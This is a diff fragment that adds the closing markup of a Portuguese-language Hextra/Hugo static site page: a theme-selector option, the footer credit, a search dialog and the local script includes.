+        class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9 hx:text-left hx:w-full hx:bg-transparent hx:border-0"
+      >
+        Sistema
+         <span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3 hx:group-data-[theme=dark]:hidden hx:group-data-[theme=light]:hidden"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span>
+      </button>
+    </li>
+  </ul>
+</div>
+</div><hr class="hx:border-gray-200 hx:dark:border-neutral-800" /><div class="hextra-custom-footer hextra-max-footer-width hx:mx-auto hx:pl-[max(env(safe-area-inset-left),1.5rem)] hx:pr-[max(env(safe-area-inset-right),1.5rem)] hx:text-gray-600 hx:dark:text-gray-400"></div><div
+      class="hextra-max-footer-width hx:mx-auto hx:flex hx:justify-center hx:py-12 hx:pl-[max(env(safe-area-inset-left),1.5rem)] hx:pr-[max(env(safe-area-inset-right),1.5rem)] hx:text-gray-600 hx:dark:text-gray-400 hx:md:justify-start"
+    >
+      <div class="hx:flex hx:w-full hx:flex-col hx:items-center hx:sm:items-start"><div class="hx:font-semibold"><a class="hx:flex hx:text-sm hx:items-center hx:gap-1 hx:text-current" target="_blank" rel="noopener noreferrer" title="Hextra GitHub Homepage" href="https://github.com/imfing/hextra">
+    <span>Com a tecnologia de Hextra<svg height=1em class="hx:inline-block hx:ltr:ml-1 hx:rtl:mr-1 hx:align-[-2.5px]" viewBox="0 0 180 180" xmlns="http://www.w3.org/2000/svg" fill="currentColor"><path fill-rule="evenodd" clip-rule="evenodd" d="m 105.50024,22.224647 c -9.59169,-5.537563 -21.40871,-5.537563 -31.000093,0 L 39.054693,42.689119 C 29.463353,48.226675 23.55484,58.460531 23.55484,69.535642 v 40.928918 c 0,11.07542 5.908513,21.3092 15.499853,26.84652 l 35.445453,20.46446 c 9.591313,5.53732 21.408404,5.53732 31.000094,0 l 35.44507,-20.46446 c 9.59131,-5.53732 15.49985,-15.7711 15.49985,-26.84652 V 69.535642 c 0,-11.075111 -5.90854,-21.308967 -15.49985,-26.846523 z M 34.112797,85.737639 c -1.384445,2.397827 -1.384445,5.352099 0,7.749927 l 24.781554,42.922974 c 1.38437,2.39783 3.942853,3.87496 6.711592,3.87496 h 49.563107 c 2.76905,0 5.3273,-1.47713 6.71144,-3.87496 l 24.78194,-42.922974 c 1.38414,-2.397828 1.38414,-5.3521 0,-7.749927 L 121.88049,42.814746 c -1.38414,-2.397828 -3.94239,-3.874964 -6.71144,-3.874964 H 65.605944 c -2.768739,0 -5.327223,1.477059 -6.711592,3.874964 z" style="stroke-width:0.774993" /></svg></span>
+  </a></div></div>
+    </div></footer>
+    
+    <dialog
+    id="hextra-search-dialog"
+    class="hextra-search-dialog"
+    aria-label="Procurar..."
+  >
+    <div class="hextra-search">
+      <div class="hextra-search-input-wrapper"><svg class="hextra-search-input-icon" focusable="false" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg><input
+          class="hextra-search-input"
+          type="search"
+          role="combobox"
+          autocomplete="off"
+          autocorrect="off"
+          autocapitalize="off"
+          spellcheck="false"
+          placeholder="Procurar..."
+          aria-label="Procurar..."
+          aria-controls="hextra-search-results"
+          aria-expanded="false"
+        /><button
+          type="button"
+          class="hextra-search-input-kbd"
+          data-search-close
+          aria-label="Close"
+        >ESC</button>
+      </div>
+      <div class="hextra-search-results-viewport" data-search-viewport>
+        <div class="hextra-search-results-inner hextra-scrollbar" data-search-inner>
+          <ul
+            id="hextra-search-results"
+            class="hextra-search-results"
+            role="listbox"
+            aria-label="Resultados da pesquisa"
+          ></ul>
+          <div class="hextra-search-empty" data-search-empty hidden>Nenhum resultado encontrado</div>
+        </div>
+      </div>
+      <div class="hextra-search-status hx:sr-only" aria-live="polite" role="status"></div>
+    </div>
+  </dialog>
+    <script defer src="/js/main.js" integrity=""></script>
+<script defer src="/js/flexsearch.9f5b5908f93ae86f1ecd4b043b799f580c2d1654e703dd9357d568ac41b2547a.js" integrity="sha256-n1tZCPk66G8ezUsEO3mfWAwtFlTnA92TV9VorEGyVHo=" crossorigin="anonymous"></script><script defer src="/pt.search.js" integrity=""></script>
+    <script defer src="/pt.search-dialog.js" integrity=""></script>
+  </body>
+</html>
